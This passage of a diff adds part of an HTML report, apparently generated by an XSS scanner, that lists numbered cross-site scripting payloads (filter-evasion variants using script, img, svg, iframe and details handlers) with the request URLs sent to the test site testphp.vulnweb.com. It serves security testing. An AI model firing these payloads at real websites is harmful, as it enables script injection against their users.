+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fsrc%3d%22data%3atext%2fhtml%2c%3csvg+%26%23111%3b%26%23110%3bload%3dalert(%2fAmoloHT%2f)%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fsrc%3d%22data%3atext%2fhtml%2c%3csvg+%26%23111%3b%26%23110%3bload%3dalert(%2fAmoloHT%2f)%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>212</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_50_75.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%00&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2500%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2500%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>213</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_50_604.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>//?aspxerrorpath=&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2f%2f%3faspxerrorpath%3d%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2f%2f%3faspxerrorpath%3d%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>214</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_50_927.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;ScRiPt>alert(1)&lt;/ScRiPt></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cScRiPt%3ealert(1)%3c%2fScRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cScRiPt%3ealert(1)%3c%2fScRiPt%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>215</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_51_470.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe src=&quot;javascript:alert(document.domain)&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+src%3d%22javascript%3aalert(document.domain)%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+src%3d%22javascript%3aalert(document.domain)%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>216</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_51_862.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;/textarea>&lt;ScRiPt>prompt(1)&lt;/ScRiPt// &quot;>&lt;iframe/onload=alert(1)// ”/>&amp;_lt;_script>alert(1)&amp;_lt;/scr_ipt&amp;gt”/></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%2ftextarea%3e%3cScRiPt%3eprompt(1)%3c%2fScRiPt%2f%2f+%22%3e%3ciframe%2fonload%3dalert(1)%2f%2f+%e2%80%9d%2f%3e%26_lt%3b_script%3ealert(1)%26_lt%3b%2fscr_ipt%26gt%e2%80%9d%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%2ftextarea%3e%3cScRiPt%3eprompt(1)%3c%2fScRiPt%2f%2f+%22%3e%3ciframe%2fonload%3dalert(1)%2f%2f+%e2%80%9d%2f%3e%26_lt%3b_script%3ealert(1)%26_lt%3b%2fscr_ipt%26gt%e2%80%9d%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>217</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_52_340.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg/onload=&#39;+/&quot;`/+/onmouseover=1/+/[*/[]/+alert(42);//&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3d%27%2b%2f%22%60%2f%2b%2fonmouseover%3d1%2f%2b%2f%5b*%2f%5b%5d%2f%2balert(42)%3b%2f%2f%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%2fonload%3d%27%2b%2f%22%60%2f%2b%2fonmouseover%3d1%2f%2b%2f%5b*%2f%5b%5d%2f%2balert(42)%3b%2f%2f%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>218</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_53_986.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=&#39;1&#39;/onerror=alert(0)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3d%271%27%2fonerror%3dalert(0)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg%2fsrc%3d%271%27%2fonerror%3dalert(0)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>219</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_55_10.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details open ontoggle=&quot;{alert`1`}&quot;>&lt;/details></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cdetails+open+ontoggle%3d%22%7balert%601%60%7d%22%3e%3c%2fdetails%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cdetails+open+ontoggle%3d%22%7balert%601%60%7d%22%3e%3c%2fdetails%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>220</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_56_91.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%3F%20&lt;script>prompt(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%253F%2520%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%253F%2520%3cscript%3eprompt(document.domain)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>221</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_57_448.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;script>alert(String.fromCharCode(88,83,83))&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(String.fromCharCode(88%2c83%2c83))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cscript%3ealert(String.fromCharCode(88%2c83%2c83))%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>222</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_57_817.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%0d%0a%20&lt;img src=1 onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%3cimg+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%250d%250a%2520%3cimg+src%3d1+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>223</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_58_275.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&amp;&quot;>&lt;script>alert(1)&lt;/script>=1</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=1%26%22%3e%3cscript%3ealert(1)%3c%2fscript%3e%3d1&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=1%26%22%3e%3cscript%3ealert(1)%3c%2fscript%3e%3d1&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>224</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_58_696.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%E5%98%8D%E5%98%8A%20&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%25E5%2598%258D%25E5%2598%258A%2520%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%25E5%2598%258D%25E5%2598%258A%2520%3cscript%3ealert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>225</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_59_197.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg>&lt;circle>&lt;set onbegin=prompt(1) attributename=fill></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3ccircle%3e%3cset+onbegin%3dprompt(1)+attributename%3dfill%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3ccircle%3e%3cset+onbegin%3dprompt(1)+attributename%3dfill%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>226</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_59_390.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>$=1,\u0061lert($)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%24%3d1%2c%5cu0061lert(%24)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%24%3d1%2c%5cu0061lert(%24)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>227</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_31_59_728.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=&#39;alert(document.domain)&#39;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3d%27alert(document.domain)%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3d%27alert(document.domain)%27%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>228</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_0_145.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;math>&lt;style>&lt;img src onerror=alert(2)>&lt;/style>&lt;/math></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cmath%3e%3cstyle%3e%3cimg+src+onerror%3dalert(2)%3e%3c%2fstyle%3e%3c%2fmath%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cmath%3e%3cstyle%3e%3cimg+src+onerror%3dalert(2)%3e%3c%2fstyle%3e%3c%2fmath%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>229</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_0_185.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>+-+-1-+-+confirm(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%2b-%2b-1-%2b-%2bconfirm(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%2b-%2b-1-%2b-%2bconfirm(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>230</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_0_290.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=&quot;eval(&#39;\x61lert(1)&#39;)&quot;/></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3d%22eval(%27%5cx61lert(1)%27)%22%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx+onerror%3d%22eval(%27%5cx61lert(1)%27)%22%2f%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>231</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_0_621.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>-->&lt;!-- ---> &lt;img src=xxx:x onerror=javascript:alert(1)> --></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=--%3e%3c!--+---%3e+%3cimg+src%3dxxx%3ax+onerror%3djavascript%3aalert(1)%3e+--%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=--%3e%3c!--+---%3e+%3cimg+src%3dxxx%3ax+onerror%3djavascript%3aalert(1)%3e+--%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>232</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_0_694.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;! foo=&quot;>&lt;script>javascript:alert(1)&lt;/script>&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c!+foo%3d%22%3e%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c!+foo%3d%22%3e%3cscript%3ejavascript%3aalert(1)%3c%2fscript%3e%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>233</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_1_9.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe srcdoc=&quot;&amp;lt;img src=1 onerror=alert(1)&amp;gt;&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%22%26lt%3bimg+src%3d1+onerror%3dalert(1)%26gt%3b%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+srcdoc%3d%22%26lt%3bimg+src%3d1+onerror%3dalert(1)%26gt%3b%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>234</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_32_1_429.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>onerror=alert();>&lt;script>alert();&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=onerror%3dalert()%3b%3e%3cscript%3ealert()%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=onerror%3dalert()%3b%3e%3cscript%3ealert()%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            </tbody>
+                    </table>
+                    <div id='modal' class='modal'>
+                        <span class='close'>&times;</span>
+                        <img class='modal-content' id='modal-image'>
+                        <div id='caption'></div>
+                    </div>
+                </body>
+                </html>
+            
